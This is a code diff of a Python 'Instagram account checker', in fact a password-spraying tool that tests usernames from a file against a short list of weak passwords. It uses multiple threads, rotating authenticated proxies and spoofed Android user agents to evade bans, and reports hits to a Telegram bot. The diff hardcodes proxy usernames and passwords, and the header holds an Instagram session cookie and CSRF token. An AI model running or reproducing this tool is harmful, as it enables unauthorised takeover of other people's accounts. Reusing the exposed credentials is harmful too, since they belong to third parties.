@@ -6,17 +6,15 @@
 # Unauthorized use is illegal, and the developer assumes no responsibility for any misuse by others.
 
 # --- Details ---
-# Version: 1.3 (Throttling Logic Added)
+# Version: 1.0 (Throttling Logic Added)
 # Date: 2025-08-02
 
 # --- Features ---
 # - Instagram account checker.
 # - Supports multi-threading and proxies (auto-switches blocked proxies).
-# - Checks usernames from usernames.txt against a fixed password list (fixedPasswords.txt, limited to 20 passwords).
+# - Checks usernames from usernames.txt against a fixed password list (fixedPasswords, limited to 20 passwords).
 # - Implements throttling to prevent bans from consecutive invalid user errors.
 
-# --- Important Note ---
-# - For stable performance, it is recommended not to use more than 5 threads, as it may cause errors.
 import requests, time, uuid, hashlib, hmac, random, json, sys, os, threading
 from queue import Queue
 from dotenv import load_dotenv
@@ -38,8 +36,19 @@ class iNstagramChecker:
 
         self.token = os.getenv("BOT_TOKEN")
         self.idd = int(os.getenv("CHAT_ID"))
+       
 
         self.proxiesList = [
+            "uphrtpvo:hlrgarxoitwa@23.95.150.145:6114",
+            "uphrtpvo:hlrgarxoitwa@198.23.239.134:6540",
+            "uphrtpvo:hlrgarxoitwa@45.38.107.97:6014",
+            "uphrtpvo:hlrgarxoitwa@107.172.163.27:6543",
+            "uphrtpvo:hlrgarxoitwa@64.137.96.74:6641",
+            "uphrtpvo:hlrgarxoitwa@45.43.186.39:6257",
+            "uphrtpvo:hlrgarxoitwa@154.203.43.247:5536",
+            "uphrtpvo:hlrgarxoitwa@216.10.27.159:6837",
+            "uphrtpvo:hlrgarxoitwa@136.0.207.84:6661",
+            "uphrtpvo:hlrgarxoitwa@142.147.128.93:6593",
             "yiclerdx:9meb73kp2ddp@23.95.150.145:6114",
             "yiclerdx:9meb73kp2ddp@198.23.239.134:6540",
             "yiclerdx:9meb73kp2ddp@45.38.107.97:6014",
@@ -60,16 +69,16 @@ class iNstagramChecker:
             "epjcuskf:g8w39g5us9mn@216.10.27.159:6837",
             "epjcuskf:g8w39g5us9mn@136.0.207.84:6661",
             "epjcuskf:g8w39g5us9mn@142.147.128.93:6593",
-            "uphrtpvo:hlrgarxoitwa@23.95.150.145:6114",
-            "uphrtpvo:hlrgarxoitwa@198.23.239.134:6540",
-            "uphrtpvo:hlrgarxoitwa@45.38.107.97:6014",
-            "uphrtpvo:hlrgarxoitwa@207.244.217.165:6712",
-            "uphrtpvo:hlrgarxoitwa@107.172.163.27:6543",
-            "uphrtpvo:hlrgarxoitwa@104.222.161.211:6343",
-            "uphrtpvo:hlrgarxoitwa@64.137.96.74:6641",
-            "uphrtpvo:hlrgarxoitwa@216.10.27.159:6837",
-            "uphrtpvo:hlrgarxoitwa@136.0.207.84:6661",
-            "uphrtpvo:hlrgarxoitwa@142.147.128.93:6593",
+            "cusvepep:aidawke2ysme@23.95.150.145:6114",
+            "cusvepep:aidawke2ysme@198.23.239.134:6540",
+            "cusvepep:aidawke2ysme@45.38.107.97:6014",
+            "cusvepep:aidawke2ysme@207.244.217.165:6712",
+            "cusvepep:aidawke2ysme@107.172.163.27:6543",
+            "cusvepep:aidawke2ysme@104.222.161.211:6343",
+            "cusvepep:aidawke2ysme@64.137.96.74:6641",
+            "cusvepep:aidawke2ysme@216.10.27.159:6837",
+            "cusvepep:aidawke2ysme@136.0.207.84:6661",
+            "cusvepep:aidawke2ysme@142.147.128.93:6593",
         ]
 
         self.stats = {
@@ -84,10 +93,11 @@ class iNstagramChecker:
         }
 
         self.fixedPasswords = [
-            "mmnnbbvv","zzzzxxxx","123456@@","mmmmnnnn", "aassddff", "qqwweerrtt", "qqwweerr",
-            "qwertqwert", "qwerqwer", "qqqqwwww", "ppooiiuu","aaaassss",
-            "zzxxccvv", "1234@@@@", "11223344@@",
+            "mmnnbbvv","zzzzxxxx","123456@@","mmmmnnnn", "aassddff", "Aa112233@", "qqwweerr",
+            "qwertqwert", "qwerqwer", "qqqqwwww", "Aa123456@","aaaassss",
+            "zzxxccvv", "1234@@@@", "11223344@@","Aa@123456"
         ]
+
     def pRintLogo(self):
         os.system('cls' if os.name == 'nt' else 'clear')
         logo = f"""
@@ -139,7 +149,7 @@ class iNstagramChecker:
 			'Accept': '*/*',
 			'Cookie': 'mid=ZHTlnQALAAFHZAE8G64BeLHXNMv6; ig_did=ACB29C06-4F89-4B7A-9D37-DC433D1E9398; ig_nrcb=1; datr=nUZ1ZAphhPG3siVLQu3QFbkq; fbm_124024574287414=base_domain=.instagram.com; csrftoken=1gI1BSItuCt7GpIB7BL3KCrapTfKligx; ds_user_id=55002803434; sessionid=55002803434%3A1m1laRSPbJaoKD%3A24%3AAYdWXJwfQhhN68tU0NIkcNODEtrIYnAgKCWPkrp3Rg; shbid="12254\05455002803434\0541717693792:01f7d20c44658c09775e0f963159681bf19a10be70bbe95b497a89f112ac2fc01ab50da0"; shbts="1686157792\05455002803434\0541717693792:01f7c175c7d720e51402db9b91b351fab16619ea5a91f0ce421bc4c9827bce14e62426c5"; fbsr_124024574287414=Z3GOftVJ7wWK4lDsT4vYGKDlPKHv5vYXWQpT8AYi130.eyJ1c2VyX2lkIjoiMTAwMDg3NjM5MTE3ODM3IiwiY29kZSI6IkFRRHRIbWwtakhjY25sQmxidDJmcGpDZmtLV2stb2FQY0lLbHpWQWtfMUlhLTNqMF9wdlhsaFUyTnJvYXRsT2lvUmJfSXNzc19oSXFyYzFRX3BLZ1RaX1RSTEhCbGpzRTFHZkFjWWJoX0Q4aVVwYWdSR2Q0bVNXcUVwai1SajlkT1J5RmxadzZHbWZCc0ZCbVdUY0RDNDAzUFVnTzV2TVBONk1UcmpSUDlpTU85dFdSc0hURFdsUVhrNDJycVhvbzM2SHlnYXRNdDJMRWlNNUZrcmVfRWtiWGUzTTlqdzY4enpKT2RVUjlIUmt2TUlXcWZqQ2RUc3FmYUo5MWowUF95bm9aLVZCSnpmb0xuSkt3MV9JTkFTQzdEZmM3ZURIeDFiTkFyRS1SQ1FhYUp3ZWtydVdzMFBYaV9pTDdYTlZrRTg5Yy1oYWVrWVI1YU45cDhwVXp0ZXBsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUhiWkNnM3M0UXJRZmhyOXRaQm5mdHI2cTlsYXJNMnpRaFpDZTNlczJOTGkwNGc4NGJaQldRTWs4VlpDWkNZMVZ3ak52azJ4M0d0VkxaQTdPajhZWkFkNklDdUxtMjI0NllhVTZQdXRlMk1PU3haQnpxbDhxUnU2UDhRYTZnRXhpUGRRbHB5WWJYSmVRczB3N2UzdFRxZXdnQWdUYXNpYzRjd0d3MHpaQUxTdXNCVUN3Y0JnVnk3MmdaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjg2MjA3NDQ4fQ; rur="ODN\05455002803434\0541717743459:01f7dc2b656c6f698ae45a64240745cb3e01e62cb90350349fcf91dba76a5d92e481be60"',
 			'Referer': 'https://www.instagram.com/5u2.a/',
-			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64 ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
 			'X-Csrftoken': '1gI1BSItuCt7GpIB7BL3KCrapTfKligx',
 			'X-Ig-App-Id': '936619743392459',
 			'X-Requested-With': 'XMLHttpRequest',}
@@ -172,8 +182,8 @@ class iNstagramChecker:
                 self.stats["error"] = f"Telegram send failed: {e}"
 
     def gEnerateRandomUserAgent(self):
-        os_versions = ["28", "29", "30", "31"]
-        api_levels = ["8", "9", "10"]
+        osVersions = ["28", "29", "30", "31"]
+        apiLevels = ["8", "9", "10"]
         dpis = ["240dpi", "280dpi", "300dpi", "320dpi", "400dpi", "420dpi", "480dpi", "560dpi", "640dpi"]
         resolutions = ["480x800", "720x1280", "800x1280", "1080x1920", "1080x2340", "1440x2560", "1440x3200"]
         manufacturers = ["samsung", "google", "xiaomi", "huawei", "oneplus", "oppo", "vivo"]
@@ -181,10 +191,10 @@ class iNstagramChecker:
         devices = ["star2lte", "flame", "whyred", "a50", "starqlte", "sargo", "joyeuse", "j7elte", "beyond1lte", "taimen", "pine", "a51", "redfin", "j6lte", "tiare", "sunfish", "lilac", "crownlte", "sunny", "bonito", "raven", "coral", "crosshatch", "blueline", "sailfish", "manta"]
         cpus = ["exynos9810", "qcom", "exynos9610", "exynos9820", "exynos7580", "exynos9611", "exynos7870", "exynos990", "qcom-msm8998", "qcom-sdm660", "qcom-sdm845", "qcom-sdm710", "qcom-sdm730", "qcom-sdm765", "qcom-sdm865", "qcom-sdm888", "qcom-sdm732", "qcom-sdm750", "qcom-sdm690", "qcom-sdm665", "qcom-sdm630", "qcom-sdm625", "qcom-sdm660", "qcom-sdm450", "qcom-sdm439", "qcom-sdm429", "qcom-sdm425"]
         locales = ["ar_AR", "en_US", "ru_RU", "en_GB", "fr_FR", "de_DE", "es_ES", "it_IT", "pt_BR", "tr_TR", "zh_CN", "ja_JP", "ko_KR"]
-        build_numbers = ["373310554"]
+        buildNumbers = ["373310554"]
 
-        os_version = random.choice(os_versions)
-        api_level = random.choice(api_levels)
+        osVersion = random.choice(osVersions)
+        apiLevel = random.choice(apiLevels)
         dpi = random.choice(dpis)
         resolution = random.choice(resolutions)
         manufacturer = random.choice(manufacturers)
@@ -192,12 +202,12 @@ class iNstagramChecker:
         device = random.choice(devices)
         cpu = random.choice(cpus)
         locale = random.choice(locales)
-        build_number = random.choice(build_numbers)
+        buildNumber = random.choice(buildNumbers)
 
-        user_agent_string = f"Instagram 237.0.0.14.102 Android ({os_version}/{api_level}; {dpi}; {resolution}; {manufacturer}; {model}; {device}; {cpu}; {locale}; {build_number})"
+        userAgentString = f"Instagram 237.0.0.14.102 Android ({osVersion}/{apiLevel}; {dpi}; {resolution}; {manufacturer}; {model}; {device}; {cpu}; {locale}; {buildNumber})"
         lang = locale.replace("_", "-")
 
-        return {"ua": user_agent_string, "lang": lang}
+        return {"ua": userAgentString, "lang": lang}
 
     def gEnerateDeviceInfo(self):
         return {"deviceId": f"android-{hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]}", "guid": str(uuid.uuid4()), "adid": str(uuid.uuid4()), "phoneId": str(uuid.uuid4())}
@@ -386,4 +396,4 @@ class iNstagramChecker:
 if __name__ == "__main__":
     checker = iNstagramChecker()
     checker.pRintLogo()
-    checker.cHeckAccounts("usernames.txt", delaySeconds=0.5, numThreads=5)
+    checker.cHeckAccounts("usernames2.txt", delaySeconds=1, numThreads=6)
